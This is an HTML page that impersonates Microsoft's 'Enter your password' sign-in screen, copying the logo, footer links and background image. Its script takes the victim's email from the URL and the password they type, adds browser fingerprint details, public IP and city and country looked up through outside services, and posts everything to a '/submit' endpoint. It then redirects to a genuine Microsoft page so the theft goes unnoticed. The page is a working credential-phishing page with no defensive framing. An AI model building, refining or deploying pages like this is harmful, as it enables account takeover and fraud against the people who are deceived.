<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Microsoft</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&amp;display=swap');

        :root {
            --ms-blue: #0078d4;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu, Cantarell, "Noto Sans", sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;        /* ← Important: stack items vertically */
            align-items: center;
            position: relative;
            overflow: hidden;
            color: #ffffff;
            background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        .login-wrapper {
            flex: 1;                       /* Takes remaining space */
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 440px;
            padding: 40px 20px;
            position: relative;
            z-index: 1;
        }


        .card {
            background: #2c2c2c;
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.6),
                        0 4px 12px rgba(0, 0, 0, 0.4);
            padding: 40px 48px 36px;
            position: relative;
        }

        /* Top header with back arrow + logo */
        .header {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 28px;
            height: 40px;
        }

        .back-arrow {
            position: absolute;
            left: 0;
            top: 4px;
            font-size: 20px;
            line-height: 1;
            color: #ffffff8a;
            text-decoration: none;
            padding: 4px 10px;
            border-radius: 4px;
            transition: background-color 0.2s ease;
        }

        .back-arrow:hover {
            background-color: rgba(255,255,255,0.1);
        }

        .microsoft-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: -1px;
            width: 28px;
            height: 28px;
        }

        .logo-square {
            width: 12.5px;
            height: 12.5px;
        }

        .red   { background-color: #F25022; }
        .green { background-color: #7FBA00; }
        .blue  { background-color: #00A4EF; }
        .yellow{ background-color: #FFB900; }

        .microsoft-text {
            font-size: 22px;
            font-weight: 500;
            letter-spacing: -0.5px;
        }
        
         .email-pill {
            background-color: #2c2c2c;
            border: 1px solid #5f6a77;
            border-radius: 9999px;
            padding: 10px 24px;
            font-size: 15px;
            color: #8a96a3;
            text-align: center;
            margin: 0 auto 24px auto;           /* Centers it + bottom spacing */
            max-width: 100%;                    /* Prevents overflow on long emails */
            width: fit-content;                 /* Auto-adjusts to text length */
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.08);
            display: block;                     /* Ensures proper centering */
            box-sizing: border-box;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 28px;
            line-height: 1.2;
        }

        .password-wrapper {
            margin-bottom: 24px;
        }

        .password-wrapper input {
            width: 100%;
            font-size: 17px;
            padding: 14px 16px;
            background-color: transparent;
            border: 1px solid #6e7a88;
            border-radius: 6px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.2s ease;
        }

        .password-wrapper input::placeholder {
            color: #8a96a3;
        }

        .password-wrapper input:focus {
            border-color: var(--ms-blue);
            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
        }
        
        .next-button {
            width: 100%;
            background-color:#0455a1;
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 17px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            box-shadow: 0 3px 8px rgba(0, 120, 212, 0.4);
            transition: background-color 0.2s ease;
        }

        .next-button:hover {
            background-color: #0066b0;
        }

        .other-ways {
            text-align: center;
            margin-top: 20px;
        }

        .other-ways a {
            color: var(--ms-blue);
            text-decoration: none;
            font-size: 15px;
            font-weight: 400;
        }

        .other-ways a:hover {
            text-decoration: underline;
        }

        .footer {
            width: 100%;
            max-width: 440px;
            padding: 20px;
            text-align: center;
            font-size: 13px;
            color: #8a96a3;
            margin-bottom: 20px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #dee1e4;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .private-browsing {
            font-size: 10px;
        }

        .private-browsing a {
            color: #dee1e4;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .card {
                padding: 32px 32px 28px;
            }
            .login-wrapper {
                padding: 12px;
            }
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="login-wrapper" id = "wrapper">
        <div class="card">
            
            <!-- Header: Back arrow + Microsoft logo -->
            <div class="header">
                <!-- Back arrow returns to the first sign-in page -->
                <a href="index.html" class="back-arrow" title="Back to sign in">←</a>
                
                <div class="microsoft-logo">
                    <div class="logo-grid">
                        <div class="logo-square red"></div>
                        <div class="logo-square green"></div>
                        <div class="logo-square blue"></div>
                        <div class="logo-square yellow"></div>
                    </div>
                    <span class="microsoft-text">Microsoft</span>
                </div>
            </div>

            <!-- Email address pill (dynamically filled from the previous page) -->
            <div id="email-pill" class="email-pill"></div>

            <!-- Title -->
            <h1>Enter your password</h1>

            <!-- Password input -->
            <div class="password-wrapper">
                <input 
                    type="password" 
                    id="password-input"
                    placeholder="Password"
                    autocomplete="current-password">
            </div>
            
            <!-- Next button -->

            <button type="button" class="next-button" onclick="handleNext()">
                Next
            </button>

            <!-- Other ways to sign in -->
            <div class="other-ways">
                <a href="#" onclick="showOtherWays(event)">Other ways to sign in</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Help and feedback</a>
            <a href="https://www.microsoft.com/servicesagreement/">Terms of use</a>
            <a href="https://privacy.microsoft.com/-">Privacy and cookies</a>
        </div>
        <div class="private-browsing">
            Use private browsing if this is not your device. 
            <a href="https://go.microsoft.com/fwlink/?LinkID=2281649">Learn more</a>
        </div>
    </div>

    <script>
        
        // This reads the email passed via URL query string (e.g. password.html?email=user@example.com)
        
        function loadEmailFromPreviousPage() {
            const urlParams = new URLSearchParams(window.location.search);
            let email = urlParams.get('email');
            const pill = document.getElementById('email-pill');
            pill.textContent = email;
            pill.title = email; // tooltip on hover
        }
        

        // Main interactivity
        async function handleNext() {
            const input = document.getElementById('password-input');
            if (input.value.trim() === '') {
                alert("Please enter your password.");
                input.focus();
                return;
            }
        
           
        const emailPill = document.getElementById('email-pill').textContent;
        const payload = {
        email: emailPill,
        password: input.value,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`
        };

        try {
        // Get public IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        payload.ip = ipData.ip;

        // You can also use https://ipapi.co/json/ for more details (city, country, etc.)
        const location = await fetch('https://ipapi.co/json/').then(r => r.json());
        payload.location = `${location.city}, ${location.country_name}`;

        
        } catch (err) {
        payload.ip = "Could not fetch IP";
        console.error("IP fetch failed:", err);
        }

        const res = await fetch('/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        if (res.ok) {

        window.location.href = `https://learn.microsoft.com/en-us/copilot/finance/welcome`;
      
        }
    }

        function showOtherWays(e) {
            e.preventDefault();
        }

        // Press Enter in password field triggers Next
        function addEnterListener() {
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    const input = document.getElementById('password-input');
                    if (document.activeElement === input) {
                        handleNext();
                    }
                }
            });
        }

        // Initialize everything when the page loads
        window.onload = function() {
            loadEmailFromPreviousPage();
            addEnterListener();
            
        };
    </script>
</body>
</html>
